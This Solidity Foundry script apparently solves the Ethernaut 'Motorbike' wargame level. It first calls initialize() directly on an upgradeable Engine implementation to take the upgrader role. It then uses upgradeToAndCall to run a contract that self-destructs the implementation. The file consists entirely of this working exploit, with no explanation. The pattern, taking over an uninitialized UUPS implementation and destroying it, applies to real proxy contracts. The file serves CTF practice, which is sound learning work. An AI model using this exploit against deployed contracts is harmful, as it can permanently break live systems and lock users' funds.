// SPDX-License-Identifier: MIT
pragma solidity ^0.8.17;

import "forge-std/Test.sol";
import {Motorbike, Engine} from "../instances/Ilevel25.sol";

contract Attacker is Test {
    function test() external {
        vm.startBroadcast();
        Engine enigne = new Engine();
        Motorbike motorbike = new Motorbike(address(enigne));
        enigne.initialize();
        bytes memory encodedData = abi.encodeWithSignature("killed()");
        Destructive d = new Destructive();
        enigne.upgradeToAndCall(address(d), encodedData);
        vm.stopBroadcast();
    }
}

contract Destructive {
    function killed() external {
        selfdestruct(payable(address(0)));
    }
}
